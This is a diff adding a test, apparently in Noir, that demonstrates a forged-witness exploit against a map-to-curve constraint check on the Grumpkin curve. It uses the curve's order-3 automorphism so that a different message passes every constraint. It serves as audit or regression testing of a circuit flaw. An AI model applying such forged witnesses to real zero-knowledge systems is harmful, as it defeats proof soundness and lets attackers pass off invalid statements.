@@ -77,3 +77,47 @@ fn exploit_missing_range_check() {
 
     // Both accepted. Messages 7 and 6 map to the same Grumpkin point.
 }
+
+// ================================================================
+// EXPLOIT: Order-3 automorphism on Grumpkin (j=0 curve)
+//
+// Grumpkin has equation y^2 = x^3 - 17 (a=0, j-invariant 0).
+// The map phi(x,y) = (omega*x, y) is an order-3 automorphism:
+//   (omega*x)^3 - 17 = omega^3 * x^3 - 17 = x^3 - 17 = y^2
+// so phi(P) is on the curve whenever P is.
+//
+// omega = 4407920970296243842393367215006156084916469457145843978461
+//       = 3^((q-1)/3) mod q,  where q = BN254 Fr
+//
+// Starting from the honest witness m1=7, x1=1792:
+//   x2 = omega * 1792 mod q
+//   m2 = x2 // 256 = 30855446792073706896753570505043092594415286200020907849227
+//   t2 = x2 %  256 = 0
+//
+// The forged witness (m2, x2, y1, z1, t2=0) passes ALL constraints.
+// No out-of-range t is needed. This is a purely algebraic attack.
+// Cost: 1 field multiplication on public data.
+// ================================================================
+
+global OMEGA: Field = 4407920970296243842393367215006156084916469457145843978461;
+
+#[test]
+fn exploit_automorphism() {
+    let x1: Field = 1792;
+    let y1: Field = 2222603532014808061213222263845635574143735707039159930479525957984581958699;
+    let z1: Field = 276759698173846535821495865193274967682377030871373817764620224677696820189;
+
+    // Honest witness
+    assert(check_map_to_curve_constraints(7, x1, y1, z1, 0));
+
+    // Automorphism: x2 = omega * x1, y2 = y1, z2 = z1
+    let x2 = OMEGA * x1;
+    let m2: Field = 30855446792073706896753570505043092594415286200020907849227;
+    let t2: Field = 0;  // in-range!
+
+    // Forged witness passes -- different message, valid t
+    assert(check_map_to_curve_constraints(m2, x2, y1, z1, t2));
+
+    // Messages are different
+    assert(7 != m2);
+}
